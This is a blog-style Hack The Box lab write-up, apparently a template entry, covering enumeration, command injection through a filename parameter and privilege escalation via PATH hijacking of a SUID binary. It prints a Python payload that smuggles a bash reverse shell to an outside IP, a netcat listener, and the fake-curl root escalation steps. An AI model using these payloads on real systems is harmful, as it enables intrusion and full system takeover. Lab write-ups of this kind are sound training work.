---
layout: post
title: "HTB: Example Machine Writeup"
date: 2026-09-01
categories: [HTB, Web]
tags: [Linux, Enumeration, Privilege Escalation, Web]
platform: HTB
difficulty: Medium
os: Linux
description: "A technical walkthrough covering port scanning, web application enumeration, initial shell access via command injection, and local privilege escalation via SUID binary."
---

> [!NOTE]
> This writeup serves as a structured template and demo entry for Hack The Box retired machine walkthroughs. Public writeups adhere to HTB disclosure guidelines.

## Executive Summary

The target system is a Medium-difficulty Linux machine. Enumeration revealed a web application running on port 80 vulnerable to command injection in an export feature. Initial access yielded low-privileged user access (`www-data`). Local enumeration identified an improperly configured custom SUID executable allowing root execution via path hijacking.

---

## 01 — Reconnaissance & Enumeration

Initial Nmap scan against the target IP address:

```bash
$ nmap -sC -sV -oA nmap/initial 10.10.11.200
```

### Scan Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Research Portal - Login
```

---

## 02 — Web Exploitation

Accessing HTTP on port 80 displays a internal portal login screen. Directory fuzzing using `gobuster`:

```bash
$ gobuster dir -u http://10.10.11.200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Discovered endpoints:
- `/api/export.php`
- `/dashboard.php`

Analyzing `/api/export.php` parameter handling revealed unescaped input passed to a system shell call:

```python
import requests

url = "http://10.10.11.200/api/export.php"
payload = "; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
data = {"filename": f"export.pdf{payload}"}

r = requests.post(url, data=data)
```

Catching the reverse shell:

```bash
$ nc -lvnp 4444
Ncat: Listening on :::4444
Ncat: Connection received from 10.10.11.200
www-data@target:~$ whoami
www-data
```

---

## 03 — Privilege Escalation

Checking for SUID binaries on the file system:

```bash
www-data@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/local/bin/status-checker
```

Analyzing `/usr/local/bin/status-checker` with `strings`:

```bash
www-data@target:~$ strings /usr/local/bin/status-checker
system
curl -I http://localhost/health
```

The binary invokes `curl` using a relative path without setting an absolute path. We perform PATH hijacking:

```bash
www-data@target:~$ cd /tmp
www-data@target:/tmp$ echo '/bin/bash -p' > curl
www-data@target:/tmp$ chmod +x curl
www-data@target:/tmp$ export PATH=/tmp:$PATH
www-data@target:/tmp$ /usr/local/bin/status-checker
root@target:/tmp# whoami
root
```

---

## 04 — Lessons Learned

1. **Input Sanitization**: Web application parameters passed directly to shell execution commands without strict escaping lead to remote code execution (RCE).
2. **Absolute Paths in SUID Executables**: Binaries executing system calls with relative commands inherit user-controlled `$PATH` environment variables, enabling root escalation.
